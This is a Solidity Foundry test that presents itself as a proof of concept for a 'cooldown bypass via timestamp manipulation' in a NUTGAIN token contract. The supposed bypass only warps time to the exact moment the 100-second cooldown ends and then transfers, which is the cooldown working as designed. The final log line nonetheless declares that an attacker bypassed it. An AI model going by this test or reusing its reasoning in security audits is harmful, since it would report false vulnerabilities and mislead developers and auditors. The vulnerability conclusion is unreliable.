// SPDX-License-Identifier: MIT
pragma solidity 0.8.7;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/NUTGAIN.sol";

contract MockFactory {
    function createPair(address, address) external pure returns (address) {
        return address(0xCAFEBEEF);
    }
}

contract MockRouter {
    MockFactory public factory;
    address public immutable WETH;

    constructor() {
        factory = new MockFactory();
        WETH = address(0xDEADBEEF);
    }
}

contract NutgainTimestampVulnerabilityTest is Test {
    NUTGAIN nutgain;
    address public owner;
    address normalUser = address(0xABCD);
    address receiver = address(0x2);

    function setUp() public {
        owner = address(this);
        MockRouter router = new MockRouter();
        nutgain = new NUTGAIN(address(router));
        
        nutgain.setTradingStatus(true, 0, 0, 0, 0, 0, 0, 0);
        nutgain.updateCooldown(true, 100);
        
        // Skip initial cooldown period
        skip(100);
        
        uint256 userAmount = nutgain.balanceOf(owner) / 10;
        nutgain.transfer(normalUser, userAmount);
    }

    function testCooldownBypassViaTimestampManipulation() public {
        uint256 transferAmount = 100;
        address receiver1 = address(0x1);
        address receiver2 = receiver;

        vm.startPrank(normalUser);
        // First transfer: valid transfer (sets cooldown timestamp)
        console.log("--- BEFORE: Initial Transfer (valid) ---");
        uint256 senderBalanceBeforeFirst = nutgain.balanceOf(normalUser);
        uint256 receiverBalanceBeforeFirst = nutgain.balanceOf(receiver1);
        console.log("Sender balance before first transfer:", senderBalanceBeforeFirst);
        console.log("Receiver1 balance before first transfer:", receiverBalanceBeforeFirst);

        nutgain.transfer(receiver1, transferAmount);

        console.log("--- AFTER: Initial Transfer (valid) ---");
        uint256 senderBalanceAfterFirst = nutgain.balanceOf(normalUser);
        uint256 receiverBalanceAfterFirst = nutgain.balanceOf(receiver1);
        console.log("Sender balance after first transfer:", senderBalanceAfterFirst);
        console.log("Receiver1 balance after first transfer:", receiverBalanceAfterFirst);
        console.log("Transfer succeeded as expected:",
            senderBalanceAfterFirst == senderBalanceBeforeFirst - transferAmount &&
            receiverBalanceAfterFirst == receiverBalanceBeforeFirst + transferAmount
            ? "YES" : "NO");
        
        uint256 firstTransferTime = block.timestamp;
        
        // Attempt to transfer within cooldown period
        console.log("--- Transfer Attempt Within Cooldown ---");
        vm.warp(firstTransferTime + 99);
        vm.expectRevert("Cooldown enabled");
        nutgain.transfer(receiver2, transferAmount);
        console.log("Transfer blocked by cooldown as expected: YES");
        
        // Bypass cooldown via timestamp manipulation
        console.log("--- BEFORE: Bypass Transfer ---");
        uint256 senderBalanceBeforeBypass = nutgain.balanceOf(normalUser);
        uint256 receiverBalanceBeforeBypass = nutgain.balanceOf(receiver2);
        console.log("Sender balance before bypass transfer:", senderBalanceBeforeBypass);
        console.log("Receiver2 balance before bypass transfer:", receiverBalanceBeforeBypass);
        
        console.log("--- TRIGGER: Timestamp Manipulation ---");
        vm.warp(firstTransferTime + 100);
        nutgain.transfer(receiver2, transferAmount);
        
        console.log("--- AFTER: Bypass Transfer ---");
        uint256 senderBalanceAfterBypass = nutgain.balanceOf(normalUser);
        uint256 receiverBalanceAfterBypass = nutgain.balanceOf(receiver2);
        console.log("Sender balance after bypass transfer:", senderBalanceAfterBypass);
        console.log("Receiver2 balance after bypass transfer:", receiverBalanceAfterBypass);
        console.log("Balance change success:",
            senderBalanceAfterBypass == senderBalanceBeforeBypass - transferAmount &&
            receiverBalanceAfterBypass == receiverBalanceBeforeBypass + transferAmount
            ? "YES" : "NO");
        
        vm.stopPrank();

        // Final vulnerability verdict
        bool vulnerabilityExists = 
            (senderBalanceAfterBypass == senderBalanceBeforeBypass - transferAmount) &&
            (receiverBalanceAfterBypass == receiverBalanceBeforeBypass + transferAmount);
        
        if (vulnerabilityExists) {
            console.log("Vulnerability Exists: Attacker successfully bypassed cooldown via timestamp manipulation");
        } else {
            console.log("Vulnerability not Exist: Balance changes not detected after bypass attempt");
        }
    }
}